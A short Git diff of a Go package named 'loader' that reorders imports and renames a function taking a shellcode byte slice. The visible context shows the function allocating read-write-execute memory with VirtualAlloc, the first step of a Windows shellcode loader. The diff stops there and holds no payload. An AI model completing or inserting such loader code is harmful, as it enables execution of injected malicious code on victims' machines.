@@ -1,14 +1,14 @@
 package loader
 
 import (
-	"golang.org/x/sys/windows"
 	"os"
 	"syscall"
 	"unsafe"
+
+	"golang.org/x/sys/windows"
 )
 
-func StaneAloneLoad(shellcode []byte) {
-
+func StaneAlone(shellcode []byte) {
 	mem, err := windows.VirtualAlloc(0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE,
 		windows.PAGE_EXECUTE_READWRITE)
 	if err != nil {
